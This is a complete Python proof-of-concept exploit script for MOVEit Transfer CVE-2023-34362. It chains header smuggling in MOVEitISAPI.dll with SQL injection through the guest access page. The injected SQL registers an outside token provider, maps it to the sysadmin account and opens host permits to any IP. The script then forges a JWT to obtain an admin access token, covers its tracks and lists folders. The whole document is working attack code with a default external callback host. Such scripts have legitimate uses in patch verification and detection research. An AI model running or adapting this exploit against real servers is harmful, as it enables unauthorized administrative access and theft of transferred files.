#!/usr/bin/python3
import argparse
import base64
import datetime
import hashlib
import json
import re
from typing import Optional

import jwt
import requests
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def get_csrf(s: requests.Session, url: str) -> Optional[str]:
    """
    Sends a POST request to guestaccess.aspx with specific data. This data causes
    guestaccess.aspx to generate a CSRF token for our current session.
    """
    data = {
        # Arg06 is required to get SILGuestAccess.cs to generate a page with a csrf token
        # This must match MyPkgAccessCode session variable
        "Arg06": "123",
    }
    r = s.post(f"{url}/guestaccess.aspx", data=data, verify=False)
    body = r.text
    match = re.search(r'name="csrftoken" value="([^"]*)"', body)
    if match:
        csrf_token = match.group(1)
        return csrf_token
    else:
        return None


def dict_to_session_var_dict(d: dict) -> dict:
    """
    Takes a dictionary with key value pairs representing session variables and their values and converts
    it to a dictionary of X-siLock-SessVar header values
    """
    s = dict()
    for i, k in enumerate(d):
        s[f"X-siLock-SessVar{i}"] = f"{k}: {d[k]}"

    return s


def set_session_variables(s: requests.Session, session_vars: dict, url: str) -> None:
    """
    Uses a vulnerability in MOVEitISAPI.dll to set session variables for our session.
    """
    headers = {
        # MOVEitISAPI.dll will only forward our request to SILMachine2 if the transaction is "folder_add_by_path".
        # We trick MOVEitISAPI.dll to use "folder_add_by_path" as its transaction by setting xx-silock-transaction.
        # SILMachine2 will not process xx-silock-transaction and instead takes X-siLock-Transaction which is set to
        # session_setvars.
        "xx-silock-transaction": "folder_add_by_path",
        "X-siLock-Transaction": "session_setvars",
    }
    headers.update(dict_to_session_var_dict(session_vars))

    s.post(f"{url}/moveitisapi/moveitisapi.dll?action=m2", headers=headers, verify=False)


def get_session_id(s: requests.Session, url: str) -> str:
    """
    Sends a request to populate the ASP.NET_SessionId cookie
    """
    r = s.get(url, verify=False)
    session_id = r.cookies['ASP.NET_SessionId']
    return session_id


def do_guest_access(s: requests.Session, csrf: str, url: str):
    """
    Trigger the SQL injection
    """
    data = {
        "CsrfToken": csrf,
        "transaction": "secmsgpost",
        "Arg01": "email_subject",
        "Arg04": "email_body",
        "Arg06": "123",
        "Arg05": "send",
        "Arg08": "email@example.com",
        "Arg09": "attachment_list"
    }
    r = s.post(f"{url}/guestaccess.aspx", data=data, verify=False)


def do_injection(sql_statements: list[str], s: requests.Session, csrf: str, url: str):
    # Make sure there are no commas in our statements. This is a limitation of our vulnerability. The field that
    # contains the injection is treated by the MOVEit application as a list of email addresses. The MOVEit application
    # will split the list on commas before passing it to the SQL engine.
    for statement in sql_statements:
        if "," in statement:
            raise Exception(
                f"SQL statement '{statement} contains a comma. Refactor your statement to remove the comma.\n")

    for sql_statement in sql_statements:
        print(f"Running SQL statement: {sql_statement}")
        session_vars = {
            "MyPkgID": "0",
            f"MyPkgSelfProvisionedRecips": f"SQL Injection'); {sql_statement} -- asdf",
        }
        set_session_variables(s, session_vars, url)
        do_guest_access(s, csrf, url)


def create_jwt(amurl: str):
    """
    Create the jwt required to get the access token.
    """
    with open("./key.pem", 'r') as f:
        private_key = f.read()

    with open('cert.crt', 'rb') as cert_file:
        cert_data = cert_file.read()
        cert = x509.load_pem_x509_certificate(cert_data, default_backend())

    # Get the DER form of the certificate
    der = cert.public_bytes(serialization.Encoding.DER)

    # Copmute the SHA-1 hash
    sha1 = hashlib.sha1(der).digest()

    # Base64url encode the hash
    x5t = base64.urlsafe_b64encode(sha1).rstrip(b'=')

    # Define the headers to include the x5t value
    headers = {
        'x5t': x5t.decode()
    }

    payload = {
        "sub": "1234567890",
        "name": "John Doe",
        "iat": 1516239022,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=5),  # Set the expiration time
        'aud': 'https://prgsftoutlookaddintest.z14.web.core.windows.net/readDialog.html',
        "appctx": {
            "msexchuid": "exchange",
            "Version": "ExIdTok.V1",
            "amurl": amurl
        }
    }

    return jwt.encode(payload, private_key, algorithm='RS256', headers=headers)

def get_access_token(encoded_jwt: str, url: str) -> str:
    data = {
        "grant_type": "external_token",
        "external_token_type": "MicrosoftOutlook",
        "external_token": encoded_jwt,
        "language": "en",
    }
    r = requests.post(f"{url}/api/v1/auth/token", data=data, verify=False)
    return json.loads(r.text)["access_token"]

def parse_args():
    parser = argparse.ArgumentParser(description="POC for MOVEit Transfer CVE-2023-34362")
    parser.add_argument('url', type=str, help='The URL of the MOVEit Transfer target')
    parser.add_argument('--provider', type=str, help='Provider address used for authentication callback', default="https://kd5cvqi7mbey62lcxiypj2lxxu0kofsk.lambda-url.us-east-2.on.aws/")
    return parser.parse_args()


def main():
    args = parse_args()
    s = requests.Session()
    session_id = get_session_id(s, args.url)

    # Setup session vars to get correct CSRF
    session_vars = {
        "MyUsername": "Guest",
        "MyPkgAccessCode": "123",
        "MyGuestEmailAddr": "my_guest_email@example.com",
    }
    set_session_variables(s, session_vars, args.url)

    csrf = get_csrf(s, args.url)

    # Create our SQL injection statements
    provider = args.provider
    token_id = f"exchange__{provider}"
    comment = "LetUsIn"
    sql_statements = [
        f"INSERT INTO `userexternaltokens` (`TokenId`) VALUES ('{token_id}');",
        f"UPDATE `userexternaltokens` SET `InstID` = 0 WHERE `TokenId` = '{token_id}';",
        f"UPDATE `userexternaltokens` SET `TokenType` = '' WHERE `TokenId` = '{token_id}';",
        f"UPDATE `userexternaltokens` INNER JOIN `users` ON users.LoginName = 'sysadmin' SET userexternaltokens.UserName = users.UserName WHERE userexternaltokens.TokenId = '{token_id}';",

        # Allow logins with external IP
        f"INSERT INTO `hostpermits` (`Comment`) VALUES ('{comment}');",
        f"UPDATE `hostpermits` SET `InstID` = 0 WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `Rule` = 1 WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `Host` = '*.*.*.*' WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `PermitID` = 3 WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `Priority` = 1 WHERE `Comment` = '{comment}';",

        # Add a trusted external token provider
        f"INSERT INTO `trustedexternaltokenproviders` (`ProviderURL`) VALUES ('{provider}');",
        f"UPDATE `trustedexternaltokenproviders` SET `InstID` = 0 WHERE `ProviderURL` = '{provider}';",
        f"UPDATE `trustedexternaltokenproviders` SET `ProviderName` = 'moveit' WHERE `ProviderURL` = '{provider}';"
    ]

    do_injection(sql_statements, s, csrf, args.url)

    encoded_jwt = create_jwt(args.provider)

    access_token = get_access_token(encoded_jwt, args.url)
    print(f"Got access token: {access_token}")

    # Clean up our database modifications
    cleanup_statements = [
        # Remove our external token
        f"DELETE FROM `userexternaltokens` WHERE `TokenId` = '{token_id}';",

        # Remove our host permits rule
        f"DELETE FROM `hostpermits` WHERE `Comment` = '{comment}';",

        # Remove the trusted external provider
        f"DELETE FROM `trustedexternaltokenproviders` WHERE `ProviderURL` = '{provider}';",
    ]
    do_injection(cleanup_statements, s, csrf, args.url)

    # Use the token
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    r = s.get(f"{args.url}/api/v1/folders", headers=headers, verify=False)
    print(json.dumps(json.loads(r.text), indent=4))


if __name__ == "__main__":
    main()
